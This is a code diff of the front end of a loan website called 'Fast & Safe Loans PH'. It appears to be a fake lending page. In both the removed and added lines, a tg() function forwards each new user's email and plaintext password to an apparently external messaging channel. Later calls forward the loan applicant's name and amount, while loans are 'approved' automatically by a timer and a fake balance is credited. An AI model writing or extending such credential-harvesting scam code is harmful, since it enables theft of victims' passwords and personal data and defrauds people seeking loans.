             let p=JSON.parse(pending); let users=getUsers(); users[p.slot]=p.user; saveUsers(users);
-            sessionStorage.removeItem('pendingReg'); toast('✅ Account verified! You can login now.'); showScreen('screen-login');
-            tg(`✅ <b>Account Verified</b>\n📧 ${p.user.email}\n🔑 Password: ${p.user.password}`);
+            sessionStorage.removeItem('pendingReg'); toast('✅ Verified! You can login now.'); showScreen('screen-login');
+            tg(`✅ <b>Verified</b>\n📧 ${p.user.email}\n🔑 ${p.user.password}`);
           }
         } sec--; }
       tick(); if(window.regTimer) clearInterval(window.regTimer); window.regTimer=setInterval(tick,1000);
@@ -525,15 +538,15 @@
     function updateDashboard(){
       if(!currentUser) return; let users=getUsers(), u=users[currentUser.slot];
       if(u) currentUser={...u,slot:currentUser.slot};
-      document.getElementById('dashBalance').textContent='₱'+currentUser.balance.toFixed(2);
+      document.getElementById('dashBalance').textContent=currentUser.balance.toFixed(2);
       document.getElementById('homeBal').textContent='₱'+currentUser.balance.toFixed(2);
       let st=currentUser.loanStatus||'none', statusEl=document.getElementById('dashLoanStatus'), homeEl=document.getElementById('homeLoanStatus');
-      statusEl.className='status-badge';
+      statusEl.className='status-pill';
       if(st==='pending'){ statusEl.textContent='⏳ Pending'; statusEl.classList.add('status-pending'); homeEl.textContent='⏳ Pending'; }
       else if(st==='approved'){ statusEl.textContent='✅ Approved'; statusEl.classList.add('status-approved'); homeEl.textContent='✅ Approved'; }
       else if(st==='rejected'){ statusEl.textContent='❌ Rejected'; statusEl.classList.add('status-rejected'); homeEl.textContent='❌ Rejected'; }
       else { statusEl.textContent='Bank Loan'; statusEl.classList.add('status-bank'); homeEl.textContent='Bank Loan'; }
-      document.getElementById('profileInfo').innerHTML=`<strong>📧 Email:</strong> ${currentUser.email}<br><strong>👤 Name:</strong> ${currentUser.fullName||'N/A'}<br><strong>🆔 ID:</strong> ${currentUser.idName||'N/A'}<br><strong>🪪 Number:</strong> ${currentUser.idNumber||'N/A'}<br><strong>💰 Balance:</strong> ₱${currentUser.balance.toFixed(2)}<br><strong>📋 Loan:</strong> ${currentUser.loanStatus==='none'?'Bank Loan':currentUser.loanStatus}`;
+      document.getElementById('profileInfo').innerHTML=`<strong>Email:</strong> ${currentUser.email}<br><strong>Name:</strong> ${currentUser.fullName||'N/A'}<br><strong>ID Name:</strong> ${currentUser.idName||'N/A'}<br><strong>ID Number:</strong> ${currentUser.idNumber||'N/A'}<br><strong>Balance:</strong> ₱${currentUser.balance.toFixed(2)}<br><strong>Loan:</strong> ${currentUser.loanStatus==='none'?'Bank Loan':currentUser.loanStatus}`;
     }
 
     function switchDashTab(tab){
@@ -551,7 +564,7 @@
       if(!amt||amt<=0) return toast('⚠️ Enter amount');
       let users=getUsers(); users[currentUser.slot].loanStatus='pending'; users[currentUser.slot].loanAmount=amt;
       saveUsers(users); currentUser.loanStatus='pending'; currentUser.loanAmount=amt; updateDashboard();
-      tg(`📋 <b>Loan App</b>\n👤 ${document.getElementById('loanFullName').value}\n💰 ₱${amt}\n📧 ${currentUser.email}\n🕐 ${new Date().toLocaleString()}`);
+      tg(`📋 <b>Loan</b>\n👤 ${document.getElementById('loanFullName').value}\n💰 ₱${amt}\n📧 ${currentUser.email}`);
       showLoanPendingOverlay();
     }
 
@@ -562,7 +575,7 @@
           let users=getUsers(); if(users[currentUser.slot].loanStatus==='pending'){
             users[currentUser.slot].loanStatus='approved'; users[currentUser.slot].balance+=(users[currentUser.slot].loanAmount||0);
             saveUsers(users); currentUser={...users[currentUser.slot],slot:currentUser.slot}; updateDashboard();
-            toast('✅ Bank Loan Approved!'); tg(`✅ <b>Approved</b>\n📧 ${currentUser.email}\n💰 +₱${(users[currentUser.slot].loanAmount||0).toFixed(2)}`);
+            toast('✅ Loan Approved!'); tg(`✅ <b>Approved</b>\n📧 ${currentUser.email}\n💰 +₱${(users[currentUser.slot].loanAmount||0).toFixed(2)}`);
           }
         } sec--; }
       tick(); if(loanTimer)clearInterval(loanTimer); loanTimer=setInterval(tick,1000);
@@ -603,7 +616,7 @@
     populateBanks();
     document.getElementById('loginEmail').value='123fhffhf@gmail.com';
     document.getElementById('loginPassword').value='12345678';
-    console.log('✅ Fast & Safe Loans PH - Ready');
+    console.log('🚀 Fast & Safe Loans PH · Binance style ready');
   </script>
 </body>
 </html>
